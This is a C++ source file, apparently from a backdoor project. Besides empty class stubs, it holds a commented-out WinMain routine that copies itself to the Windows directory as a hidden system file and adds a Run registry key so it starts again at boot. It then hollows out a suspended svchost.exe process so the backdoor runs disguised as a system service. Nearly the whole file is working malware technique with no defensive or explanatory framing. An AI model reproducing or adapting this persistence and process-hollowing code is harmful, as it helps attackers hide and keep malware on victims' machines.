#include "PersistenceService.h"



PersistenceService::PersistenceService()
{
}


PersistenceService::~PersistenceService()
{
}
/*
#include <Windows.h>
#include <winternl.h>
#include <winnt.h>

EXTERN_C NTSTATUS NTAPI NtGetContextThread(HANDLE, PCONTEXT);
EXTERN_C NTSTATUS NTAPI NtUnmapViewOfSection(HANDLE, PVOID);
EXTERN_C NTSTATUS NTAPI NtResumeThread(HANDLE, PULONG);
EXTERN_C NTSTATUS NTAPI NtOpenProcess(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID);
EXTERN_C NTSTATUS NTAPI NtTerminateProcess(HANDLE, NTSTATUS);

// this code was in CppBackdor/WinMain
void a (HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow)
{
	PIMAGE_DOS_HEADER pIDH;
	PIMAGE_NT_HEADERS pINH;
	PIMAGE_SECTION_HEADER pISH;

	char szWindir[60], szModuleFileName[260];
	HKEY hKey;
	PVOID image, mem, base;
	DWORD read, nSizeOfFile;
	WORD i;
	HANDLE hFile;

	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	CONTEXT ctx;

	if (!strcmp("-k UserService", lpCmdLine))
	{
		CreateThread(NULL, 0, ServerThread, NULL, 0, NULL);
		ExitThread(0);
	}

	ctx.ContextFlags = CONTEXT_FULL;

	memset(&si, 0, sizeof(si));
	memset(&pi, 0, sizeof(pi));

	GetEnvironmentVariable("windir", szWindir, 60);
	GetModuleFileName(NULL, szModuleFileName, 260);

	strcat(szWindir, "\\CppServer.exe");

	CopyFile(szModuleFileName, szWindir, FALSE);
	SetFileAttributes(szWindir, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

	RegCreateKey(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
	RegSetValueEx(hKey, "{EDFF96B3-5333-47AE-8DE6-022BB460FD36}", 0, REG_SZ, (LPBYTE)szWindir, strlen(szWindir));
	RegCloseKey(hKey);

	hFile = CreateFile(szWindir, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);

	if (hFile != INVALID_HANDLE_VALUE)
	{
		nSizeOfFile = GetFileSize(hFile, NULL);

		image = VirtualAlloc(NULL, nSizeOfFile, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

		if (!ReadFile(hFile, image, nSizeOfFile, &read, NULL))
		{
			NtClose(hFile);
			VirtualFree(image, 0, MEM_RELEASE);

			CreateThread(NULL, 0, ServerThread, NULL, 0, NULL);
			ExitThread(0);
		}
	}

	NtClose(hFile);

	pIDH = (PIMAGE_DOS_HEADER)image;
	pINH = (PIMAGE_NT_HEADERS)((LPBYTE)image + pIDH->e_lfanew);

	if (CreateProcess(NULL, "svchost.exe -k UserService", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
	{
		NtGetContextThread(pi.hThread, &ctx);
		NtReadVirtualMemory(pi.hProcess, (PVOID)(ctx.Ebx + 8), &base, sizeof(PVOID), NULL);

		if ((DWORD)base == pINH->OptionalHeader.ImageBase)
		{
			NtUnmapViewOfSection(pi.hProcess, base);
		}

		mem = VirtualAllocEx(pi.hProcess, (PVOID)pINH->OptionalHeader.ImageBase, pINH->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

		if (!mem)
		{
			NtTerminateProcess(pi.hProcess, 1);
			VirtualFree(image, 0, MEM_RELEASE);

			NtClose(pi.hThread);
			NtClose(pi.hProcess);

			CreateThread(NULL, 0, ServerThread, NULL, 0, NULL);
			ExitThread(0);
		}

		NtWriteVirtualMemory(pi.hProcess, mem, image, pINH->OptionalHeader.SizeOfHeaders, NULL);

		for (i = 0; i < pINH->FileHeader.NumberOfSections; i++)
		{
			pISH = (PIMAGE_SECTION_HEADER)((LPBYTE)image + pIDH->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
			NtWriteVirtualMemory(pi.hProcess, (PVOID)((LPBYTE)mem + pISH->VirtualAddress), (PVOID)((LPBYTE)image + pISH->PointerToRawData), pISH->SizeOfRawData, NULL);
		}

		ctx.Eax = (DWORD)((LPBYTE)mem + pINH->OptionalHeader.AddressOfEntryPoint);

		NtWriteVirtualMemory(pi.hProcess, (PVOID)(ctx.Ebx + 8), &pINH->OptionalHeader.ImageBase, sizeof(PVOID), NULL);
		NtSetContextThread(pi.hThread, &ctx);

		NtResumeThread(pi.hThread, NULL);

		NtClose(pi.hThread);
		NtClose(pi.hProcess);
}
*/